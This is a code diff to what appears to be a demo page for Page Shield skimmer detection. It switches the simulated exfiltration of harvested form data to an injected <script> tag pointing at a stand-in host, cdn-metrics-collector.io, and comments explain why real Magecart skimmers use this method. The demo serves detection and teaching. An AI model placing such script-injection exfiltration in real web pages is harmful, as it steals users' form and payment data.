@@ -354,32 +354,51 @@ document.addEventListener("blur", function (e) {
           dt: new Date().toISOString(),
         });
         const exfilUrl =
-          "https://cdn-metrics-collector.io/px?" + params.toString();
+          "https://cdn-metrics-collector.io/px.js?" + params.toString();
 
-        // Beat 3: fire the beacon. Will fail at the network layer (CORS / no
-        // such host) but Page Shield captures the attempt either way.
+        // Beat 3: inject a <script> tag with the oversized URL. This is
+        // exactly how real Magecart skimmers exfiltrate harvested data —
+        // they inject pixel/script beacons rather than fetch/XHR calls,
+        // because <script src=...> requests bypass same-origin restrictions
+        // and (more importantly here) are visible to Page Shield's script
+        // inventory monitoring. The script will 404 at the network layer
+        // because the host doesn't exist, but Page Shield captures the
+        // attempt before that happens.
         try {
-          if (navigator.sendBeacon) {
-            navigator.sendBeacon(exfilUrl);
-          } else {
-            // Best-effort fallback
-            fetch(exfilUrl, { mode: "no-cors", keepalive: true }).catch(() => {});
-          }
+          const s = document.createElement("script");
+          s.src = exfilUrl;
+          s.async = true;
+          // Listeners suppress console noise; nothing depends on the result.
+          s.onerror = () => { /* expected — host does not resolve */ };
+          s.onload = () => { /* won't happen */ };
+          document.head.appendChild(s);
         } catch (e) {
           /* expected */
         }
 
+        // Also surface this as a new "loaded script" in the inventory so the
+        // visual story matches what Page Shield will actually report.
+        this.scripts = [
+          ...this.scripts,
+          {
+            url: exfilUrl,
+            label: "UNKNOWN ORIGIN — injected at runtime",
+            status: "malicious",
+            hash: "(no fingerprint)",
+          },
+        ];
+
         this.network = [
           {
             t: this.ts(),
-            method: "POST",
-            status: "(blocked / network err)",
+            method: "GET",
+            status: "(script injection)",
             url: exfilUrl,
             severity: "critical",
             note:
-              "URL length: " +
+              "Injected <script src=...> — URL length " +
               exfilUrl.length +
-              " chars — exceeds Page Shield monitoring threshold",
+              " chars, exceeds Page Shield Max URL Length threshold",
           },
           ...this.network,
         ];
@@ -391,9 +410,9 @@ document.addEventListener("blur", function (e) {
           visible: true,
           title: "Page Shield Alert: Max URL Length Exceeded",
           detail:
-            "An outbound connection from this page used a URL of " +
+            "A script was loaded with a URL of " +
             exfilUrl.length +
-            " characters, exceeding the configured monitoring threshold. URLs of this length are commonly used to exfiltrate harvested form data via query-string encoding.",
+            " characters, exceeding the configured monitoring threshold. URLs of this length on script tags are commonly used by Magecart-style skimmers to exfiltrate harvested form data via query-string encoding.",
           resource: "cdn-metrics-collector.io",
         };
 
@@ -471,6 +490,9 @@ document.addEventListener("blur", function (e) {
           s.label = "remydemo analytics (first-party)";
           s.hash = "f04c…ad29";
         }
+
+        // Strip any malicious scripts injected during the exfil demo
+        this.scripts = this.scripts.filter((x) => x.status !== "malicious");
 
         this.formCompromised = false;
         this.alert.visible = false;
